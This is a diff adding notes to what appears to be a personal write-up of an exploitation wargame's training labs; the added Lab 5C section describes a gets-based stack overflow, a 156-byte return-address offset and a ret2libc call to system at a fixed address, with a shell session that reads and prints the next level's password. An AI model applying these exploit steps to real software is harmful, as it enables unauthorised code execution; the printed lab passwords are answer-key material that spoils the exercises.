@@ -187,3 +187,22 @@ uid=1016(lab4A) gid=1017(lab4A) euid=1017(lab4end) groups=1018(lab4end),1001(gam
 $ cat ~lab4end/.pass
 1t_w4s_ju5t_4_w4rn1ng
 ```
+
+## Lab 5
+### Lab 5C
+* Overflow in `copytoglobal`.
+* Safely copied to a global (Gives us an easy spot to put "/bin/sh").
+  * 0x804a060
+* Uses `gets` so we can put in null bytes.
+* RA overwritten after 156 bytes.
+* Simple ret2libc
+  * `system` at 0xb7e63190
+* See _lab5C.py_.
+
+```bash
+lab5C@warzone:/levels/lab05$ (python /tmp/lab5C.py; cat -) | ./lab5C
+I included libc for you...
+Can you ROP to system()?
+cat ~lab5B/.pass
+s0m3tim3s_r3t2libC_1s_3n0ugh
+```
